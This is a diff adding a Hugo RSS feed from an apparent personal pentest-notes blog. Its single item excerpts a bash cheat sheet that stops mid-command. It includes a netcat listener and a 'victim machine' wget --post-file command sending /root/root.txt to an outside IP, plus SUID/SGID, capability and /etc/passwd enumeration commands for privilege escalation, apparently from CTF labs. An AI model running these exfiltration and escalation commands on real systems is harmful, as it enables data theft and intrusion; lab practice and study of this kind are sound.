@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Awk on pentest notes</title>
+    <link>sosprz.github.io/tags/awk/</link>
+    <description>Recent content in Awk on pentest notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>Your language code</language>
+    <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
+    
+	<atom:link href="sosprz.github.io/tags/awk/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Bash commands</title>
+      <link>sosprz.github.io/post/bash-commands/</link>
+      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
+      
+      <guid>sosprz.github.io/post/bash-commands/</guid>
+      <description>#www server  python -m SimpleHTTPServer 8000 
+#on our kali machine we run:
+nc -lvnp 7734
+#On the victim machine we run:
+sudo wget &amp;ndash;post-file=/root/root.txt 10.10.14.4:7734
+#curl download curl http://some.url &amp;ndash;output some.file
+#Sort
+ls -ltr
+#wrap ps commands ps auxww
+#remove all before
+cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5 awk -F &amp;ldquo;:&amp;rdquo; &amp;lsquo;{print $1}&amp;rsquo; /etc/passwd
+ #capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null find / -user root -perm -o=w -type f -not -path &#34;</description>
+    </item>
+    
+  </channel>
+</rss>
